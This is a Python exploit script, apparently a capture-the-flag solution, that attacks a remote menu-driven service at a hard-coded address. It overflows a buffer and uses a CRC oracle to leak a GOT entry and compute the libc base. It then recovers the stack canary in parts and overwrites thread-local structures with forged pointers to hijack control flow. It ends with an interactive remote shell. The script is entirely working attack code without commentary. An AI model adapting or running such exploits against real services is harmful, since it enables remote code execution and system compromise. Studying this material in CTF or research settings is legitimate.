import socket
import struct
import time
import telnetlib

def p(x):
    return struct.pack('<Q', x)

def p32(x):
    return struct.pack('<I', x)

def up(x):
    return struct.unpack('<Q', x)[0]

def readuntil(f, delim='msg?\n'):
    d = ''
    while not d.endswith(delim):
        n = f.read(1)
        if len(n) == 0:
            print 'EOF'
            break
        d += n
    return d[:-len(delim)]

def read_menu(f):
	readuntil(f, '# ')

def defcon_gg(f, size):
	f.write('1\n')
	readuntil(f, 'you want? ')
	f.write(size + '\n')

def defcon(f, size, content):
	f.write('1\n')
	readuntil(f, 'you want? ')
	f.write(size + '\n')
	readuntil(f, 'Remark: ')
	f.write(content + '\n')

def codegate(f, time):
	f.write('3\n')
	readuntil(f, 'timestamp: ')
	f.write(time + '\n')

host = '104.197.7.111'#'192.168.165.133'
port = 1002

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
f = s.makefile('rw', bufsize=0)

raw_input('wait')

malloc_got = 0x602058
malloc_offset = 0x82750
start_main_offset = 0x21dd0

fs_offset = 0xae4780 + 22 * 0x1000

#0x7fb1f9883750
'''
0x602058 <malloc@got.plt>:	0x50	0x37	0x88	0xf9	0xb1	0x7f	0x00	0x00
0x602060 <__libc_start_main@got.plt>:	0xd0	0x2d	0x82	0xf9	0xb1	0x7f	0x00	0x00
0x602068 <gmtime@got.plt>:	0xb0	0x18	0x8b	0xf9
'''

read_menu(f)
defcon(f, '1', '1')

read_menu(f)
codegate(f, '1')

read_menu(f)
payload = 'A' * 0x400 + p(malloc_got) * (0x400 / 2)
defcon_gg(f, payload)

read_menu(f)
codegate(f, '')

readuntil(f, 'Response: ')
crc_result = int(f.read(10), 16)
print 'crc_result: %s' % hex(crc_result)

import commands
cmd = '/Users/Kay/pwn/bctf/a.out ' + str(crc_result)
print cmd
a, b = commands.getstatusoutput(cmd)
malloc_addr = int(b, 16)
libc_base = malloc_addr - malloc_offset

print 'libc_base: %s' % hex(libc_base)
fs_addr = libc_base + fs_offset
print 'fs: %s' % hex(fs_addr)

read_menu(f)
payload = 'A' * 0x400 + p(fs_addr + 0x20) * (0x400 / 2)
defcon_gg(f, payload)

read_menu(f)
codegate(f, '')

readuntil(f, 'Response: ')
crc_result = int(f.read(10), 16)
print 'crc_result: %s' % hex(crc_result)

import commands
cmd = '/Users/Kay/pwn/bctf/crc_part1 ' + str(crc_result)
print cmd
a, b = commands.getstatusoutput(cmd)
canary_low = int(b, 16)
print 'canary_low: %s' % hex(canary_low)

read_menu(f)
payload = 'A' * 0x400 + p(fs_addr + 0x22) * (0x400 / 2)
defcon_gg(f, payload)

read_menu(f)
codegate(f, '')

readuntil(f, 'Response: ')
crc_result = int(f.read(10), 16)
print 'crc_result: %s' % hex(crc_result)

#import commands
cmd = '/Users/Kay/pwn/bctf/crc_part2 ' + str(crc_result) + ' ' + str(canary_low)
print cmd
a, b = commands.getstatusoutput(cmd)
canary_hl = int(b, 16)
canary_low = canary_low + canary_hl * 0x100000000
print 'canary_low: %s' % hex(canary_low)

read_menu(f)
payload = 'A' * 0x400 + p(fs_addr + 0x24) * (0x400 / 2)
defcon_gg(f, payload)

read_menu(f)
codegate(f, '')

readuntil(f, 'Response: ')
crc_result = int(f.read(10), 16)
print 'crc_result: %s' % hex(crc_result)

#import commands
cmd = '/Users/Kay/pwn/bctf/crc_part3 ' + str(crc_result) + ' ' + str(canary_low)
print cmd
a, b = commands.getstatusoutput(cmd)
canary_hl = int(b, 16)
canary = canary_low + canary_hl * 0x1000000000000
print 'canary: %s' % hex(canary)

malloc_to_fs = 0x102770
item_to_fs = 0x1026a0

nl_global_offset = 0x3bf060
res_offset = 0x3c33e0
toupper_offset = 0x167c80
tolower_offset = 0x167680
class_offset = 0x168580
arena_offset = 0x3be760

binsh_offset = 0x17ccdb
system_offset = 0x46640
pop_rdi_ret = 0x401503

#vuln_addr = 0x4141414141414141
dead_addr = 0x69ea000000000020 #0x40d3d4 
target_addr = libc_base + 0x4652c
vuln_addr = target_addr ^ dead_addr

payload = 'A' * item_to_fs
payload += p(nl_global_offset + libc_base)
payload += p(res_offset + libc_base)
payload += p(0) * 2
payload += p(toupper_offset + libc_base) + p(0)
payload += p(tolower_offset + libc_base) + p(0)
payload += p(class_offset + libc_base) + p(0)
payload += p(0) * 4
payload += p(arena_offset + libc_base) + p(0)

payload += p(0) * 10
assert(len(payload) == malloc_to_fs)

payload += p(fs_addr)
payload += p(fs_addr + 0x910)
payload += p(fs_addr)
payload += p(0) * 2
payload += p(canary)
payload += p(vuln_addr)
payload += p(0)

read_menu(f)
defcon(f, '1048576', payload)

read_menu(f)
f.write('2\n')

t = telnetlib.Telnet()
t.sock = s
t.interact()
